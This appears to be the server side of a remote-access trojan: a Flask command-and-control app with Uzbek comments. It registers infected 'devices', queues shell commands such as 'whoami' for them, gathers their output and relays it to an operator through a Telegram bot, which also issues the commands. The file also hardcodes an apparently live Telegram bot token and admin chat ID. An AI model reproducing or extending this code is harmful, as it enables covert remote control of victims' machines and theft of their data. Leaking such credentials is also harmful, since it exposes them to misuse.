# server.py
import datetime
import logging
from flask import Flask, request, jsonify
from telegram import Bot

# --------------------
# Config
# --------------------
BOT_TOKEN = "7754620943:AAESsQB-tTOxNlpgr9yfhieOR5ua4enR5DU"
ADMIN_CHAT_ID = 1612270615  # faqat sizning ID

bot = Bot(BOT_TOKEN)

# Flask app
app = Flask(__name__)

# Logging sozlamasi
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler()]
)

# --------------------
# Xotira
# --------------------
devices = {}    # {deviceId: {"hostname":..., "lastSeen":...}}
commands = {}   # {deviceId: ["dir", "whoami", ...]}
selected_device = None


# --------------------
# Routes
# --------------------
@app.route("/hello")
def hello():
    return "Hello World", 200


@app.route("/register", methods=["POST"])
def register():
    """Yangi qurilma ro‘yxatdan o‘tadi"""
    data = request.json
    deviceId = data.get("deviceId")
    hostname = data.get("hostname")

    if not deviceId or not hostname:
        return jsonify({"error": "deviceId va hostname kerak"}), 400

    devices[deviceId] = {"hostname": hostname, "lastSeen": datetime.datetime.now()}
    commands.setdefault(deviceId, [])

    logging.info(f"Yangi qurilma: {hostname} ({deviceId})")
    bot.send_message(
        ADMIN_CHAT_ID,
        f"✅ Yangi device qo'shildi!\n💻 {hostname}\n🆔 {deviceId}"
    )

    return jsonify({"status": "ok"}), 200


@app.route("/get-command/<deviceId>")
def get_command(deviceId):
    """Qurilma buyruqlarni olib ketadi"""
    cmds = commands.get(deviceId, [])
    commands[deviceId] = []  # olgandan keyin bo‘shatamiz
    return jsonify({"commands": cmds}), 200


@app.route("/send-result", methods=["POST"])
def send_result():
    """Qurilma buyruq natijasini yuboradi"""
    data = request.json
    deviceId = data.get("deviceId")
    cmd = data.get("cmd")
    result = data.get("result")

    if not deviceId or not cmd or result is None:
        return jsonify({"error": "deviceId, cmd va result kerak"}), 400

    text = f"💻 {deviceId} → {cmd}\n-----------------\n"
    # Natija 4000 belgidan uzun bo‘lsa, bo‘lib yuboramiz
    chunk_size = 4000
    for i in range(0, len(result), chunk_size):
        bot.send_message(ADMIN_CHAT_ID, text + result[i:i+chunk_size])

    logging.info(f"Natija qabul qilindi: {deviceId} → {cmd}")
    return jsonify({"status": "ok"}), 200


@app.route("/telegram/<command>")
def telegram_handler(command):
    """Telegram orqali admin boshqaruvi"""
    global selected_device
    args = request.args.get("args", "").split()

    if command == "devices":
        if not devices:
            bot.send_message(ADMIN_CHAT_ID, "❌ Hozircha device yo'q")
        else:
            text = "📋 Aktiv qurilmalar:\n"
            for d, info in devices.items():
                text += f"💻 {info['hostname']} (ID: {d})\n"
            bot.send_message(ADMIN_CHAT_ID, text)

    elif command == "select":
        if args:
            deviceId = args[0]
            if deviceId in devices:
                selected_device = deviceId
                bot.send_message(ADMIN_CHAT_ID, f"✅ Device tanlandi: {selected_device}")
            else:
                bot.send_message(ADMIN_CHAT_ID, "❌ Bunday ID topilmadi")
        else:
            bot.send_message(ADMIN_CHAT_ID, "❌ ID kiritilmadi")

    elif command == "command":
        if selected_device and args:
            cmd = " ".join(args)
            commands[selected_device].append(cmd)
            bot.send_message(ADMIN_CHAT_ID, f"📤 Buyruq yuborildi: {cmd}")
        else:
            bot.send_message(ADMIN_CHAT_ID, "❌ Avval device tanlang: /select <id>")

    else:
        bot.send_message(ADMIN_CHAT_ID, f"❌ Noma’lum command: {command}")

    return jsonify({"status": "ok"}), 200


# --------------------
# Run
# --------------------

